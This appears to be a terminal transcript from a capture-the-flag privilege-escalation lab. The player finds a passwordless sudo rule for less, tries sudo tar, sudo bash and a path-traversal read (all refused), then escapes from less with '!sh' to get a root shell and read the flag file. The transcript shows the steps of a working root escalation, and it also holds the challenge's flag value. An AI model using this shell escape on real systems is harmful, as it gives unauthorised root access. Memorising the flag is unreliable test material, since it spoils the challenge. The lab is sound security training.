@@ -1,0 +1,80 @@
+
+==========================================================================
+player@lx02:~$ id
+uid=1001(player) gid=1001(player) groups=1001(player)
+[rc=0]
+
+==========================================================================
+player@lx02:~$ ls -l /flag.txt; ls -ld /var/log/app; ls -l /var/log/app
+-r-------- 1 root root 18 Nov 19 00:10 /flag.txt
+drwxr-x--- 2 root root 4096 Nov 19 00:10 /var/log/app
+[stderr] ls: cannot open directory '/var/log/app': Permission denied
+[rc=2]
+
+==========================================================================
+player@lx02:~$ cat /var/log/app/app.log
+[stderr] cat: /var/log/app/app.log: Permission denied
+[rc=1]
+
+==========================================================================
+player@lx02:~$ sudo -n -l
+Matching Defaults entries for player on 0aa9f11ca76c:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User player may run the following commands on 0aa9f11ca76c:
+    (root) NOPASSWD: /usr/bin/less ^/var/log/app/[A-Za-z0-9._-]+$
+[rc=0]
+
+==========================================================================
+player@lx02:~$ sudo -n /usr/bin/tar -czf /tmp/x /var/log/app/ 2>&1
+sudo: a password is required
+[rc=1]
+
+==========================================================================
+player@lx02:~$ sudo -n /bin/bash 2>&1
+sudo: a password is required
+[rc=1]
+
+==========================================================================
+player@lx02:~$ sudo -n /usr/bin/less -X /var/log/app/../../flag.txt 2>&1
+sudo: a password is required
+[rc=1]
+
+==========================================================================
+[pty] sudo less /var/log/app/app.log  →  !sh  →  id; cat /flag.txt
+[?2004hplayer@0aa9f11ca76c:~$ sudo less /var/log/app/app.log
+
+[?2004l
+[?1h=
+[2024-03-11 09:00:01] app started
+
+[2024-03-11 09:01:12] db connect ok
+
+[2024-03-11 09:05:40] WARN slow query 1.2s
+
+[7m/var/log/app/app.log (END)[m[K
+--- inside less, type !sh ---
+
+[K![Kss[Khh
+[K
+[K!sh
+
+[?1l># 
+id
+
+uid=0(root) gid=0(root) groups=0(root)
+
+# 
+cat /flag.txt
+
+Ly_Flag{cv1vmsdr}
+
+# 
+exit
+
+!done  (press RETURN)
+
+
+[?1h=
+
+[K[?1l>[?2004hplayer@0aa9f11ca76c:~$ 
